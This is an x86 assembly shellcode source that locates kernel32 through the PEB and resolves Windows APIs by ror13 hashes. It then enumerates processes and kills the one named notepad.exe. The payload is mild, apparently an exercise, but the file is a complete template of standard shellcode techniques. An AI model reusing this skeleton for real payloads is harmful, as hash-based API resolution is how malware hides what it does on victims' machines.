.386
.model flat
.stack 4096

.code
_shellcode proc
assume fs:nothing

start:
  ; Stack preparation
  mov ebp, esp
  sub esp, 138h
  push ebx
  push esi
  push edi

  ; Find kernel address
  mov eax, fs:[30h]
  mov eax, dword ptr [eax + 0ch]
  mov eax, dword ptr [eax + 14h]
  mov eax, dword ptr [eax]
  mov eax, dword ptr [eax]
  mov esi, dword ptr [eax + 10h]

  ;Prepare call find_function for Process32First
  mov edx, 0c086ac6eh
  mov ecx, esi

  call find_function

  ;Prepare call find_function for Process32Next
  mov edx, 0e5b35711h
  mov dword ptr [ebp - 08h], eax
  mov ecx, esi

  call find_function

  ; Prepare call find_function for OpenProcess
  mov edx, 8e5f8b88h
  mov ecx, esi
  mov ebx, eax

  call find_function

  ; Prepare call find_function for TerminateProcess
  mov edx, 6f22b47h
  mov dword ptr [ebp - 0ch], eax
  mov ecx, esi

  call find_function

  ; Prepare call find_function for ExitProcess
  mov  edx, 125fcc46h
  mov dword ptr [ebp - 10h], eax
  mov ecx, esi

  call find_function

  ; Prepare call find_function for CloseHandle
  mov edx, 0ae7a8bc2h
  mov ecx, esi
  mov edi, eax

  call find_function

  ; Prepare call find_function for CreateToolhelp32Snapshot
  mov edx, 6661102fh
  mov dword ptr [ebp - 04h], eax
  mov ecx, esi

  call find_function

  ; Prepare for __stdcall CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
  push 00h
  push 02h

  call eax

  ; Check for INVALID_HANDLE_VALUE
  mov esi, eax
  cmp esi, 0ffffffffh
  ; if not equal continue execution
  jne valid_handle

  ; else terminate execution
  ; ExitProcess(-1)
  push eax
  call edi

valid_handle:
  ; Set size PROCESSENTRY32 struct
  lea eax, [ebp - 138h]
  mov dword ptr [ebp - 138h], 128h

  ; 98: 01 00 0

  ; Prepare for call Process32First 
  push eax
  push esi

  call dword ptr [ebp - 08h]

  ; Compare with 0
  test eax, eax
  
  ; if not equal continue execution
  jne process_loop

  ; else prepare terminate execution
  ; CloseHandle(_hSnaphot)
  push esi
  call dword ptr [ebp - 04h]

  ; Call ExitProcess(-2)
  push 0fffffffeh
  call edi

process_loop:
  mov cl, byte ptr [ebp - 114h]
  lea edx, [ebp - 114h]

  ; find ror13_hash of given process name (inlined ror13_hash func)
  ; set current hash value to 0
  xor eax, eax

  ; if first byte is zero goto call Process32Next
  test cl, cl
  je continue_process_loop

  ; else start has calculation
hash_process_calc:
  ror eax, 0dh
  lea edx, [edx + 1]
  movsx ecx, cl
  add eax, 0ffffffe0h
  add eax, ecx
  mov cl, byte ptr [edx]

  test cl, cl
  jne hash_process_calc

  ; Compare calculated hash with reference hash of notepad.exe
  cmp eax, 7406d259h
  je hash_process_match

continue_process_loop:
; Prepare for call Process32Next
  lea eax, [ebp - 138h]
  push eax
  push esi

  call ebx
  
  ; if result not zero - continie process loop
  test eax, eax
  jne process_loop

  ; else prepare terminate execution
  ; CloseHandle(_hSnaphot)
  push esi
  call dword ptr [ebp - 04h]
  ; ExitProcess(0)
  push 0
  call edi 
hash_process_match:
  ; Prepare for call OpenProcess(PROCESS_TERMINATE, FALSE, __pe32.th32ProcessID)
  push dword ptr [ebp - 130h]
  push 0
  push 1

  call dword ptr [ebp - 0ch]

  ; if result is not NULL continue execution
  mov ebx, eax
  test ebx, ebx
  jne process_is_opened

  ; else prepare terminate execution
  ; CloseHandle(_hSnaphot)
  push esi
  call dword ptr [ebp - 04h]
  ; ExitProcess(-3)
  push 0fffffffdh
  call edi

process_is_opened:
  ; Prepare for call TerminateProcess(_hProcess, 0)
  push 0
  push ebx

  call dword ptr [ebp - 10h]

  ; CloseHandle(_hProcess)
  push ebx
  call dword ptr [ebp - 04h]
  ; CloseHandle(_hSnaphot)
  push esi
  call dword ptr [ebp - 04h]
  ; ExitProcess(0)
  push 0
  call edi

find_function:
  ; Stack preparation
  push ebp
  mov ebp, esp
  sub esp, 10h
  push ebx
  push esi
  push edi
  mov edi, ecx
  mov dword ptr [ebp - 04h], edx
  xor esi, esi
  mov eax, dword ptr [edi + 3ch]
  mov eax, dword ptr [eax + edi * 1 + 78h]
  add eax, edi
  mov edx, dword ptr [eax + 1ch]
  mov ecx, dword ptr [eax + 20h]
  add edx, edi
  mov ebx, dword ptr [eax + 18h]
  add ecx, edi
  mov dword ptr [ebp - 10h], edx
  mov edx, dword ptr [eax + 24h]
  add edx, edi
  mov dword ptr [ebp - 8h], ecx
  mov dword ptr [ebp - 0ch], edx

  test ebx, ebx
  je find_function_ret_fail

  ; find ror13_hash of given func name (inlined ror13_hash func)
func_loop:
  mov eax, dword ptr [ecx + esi * 4]
  xor edx, edx
 
  mov cl, byte ptr [eax + edi * 1]
  add eax, edi

  test cl, cl
  je hash_func_end

  hash_func_loop:
  ror edx, 0dh
  lea eax, [eax + 1]
  movsx ecx, cl
  add edx, 0ffffffe0h
  add edx, ecx
  mov cl, byte ptr [eax]

  test cl, cl
  jne hash_func_loop

  hash_func_end:
  ; compare with provided hash value if equal return address of this function
  cmp dword ptr [ebp - 04h], edx
  je find_funciton_ret_succcess

  ; else continue iterate over function names
  mov ecx, dword ptr [ebp - 08h]
  inc esi

  ; if there are still function names continute iterate
  cmp esi, ebx
  jb func_loop

find_function_ret_fail:
  pop edi
  pop esi
  xor eax, eax
  pop ebx
  mov esp, ebp
  pop ebp
  ret

find_funciton_ret_succcess:
mov eax, dword ptr [ebp - 0ch]
mov ecx, dword ptr [ebp - 10h]
movzx eax, word ptr [eax + esi * 2]
mov eax, dword ptr [ecx + eax * 4]
add eax, edi
pop edi
pop esi
pop ebx
mov esp, ebp
pop ebp
ret

_shellcode endp

end _shellcode
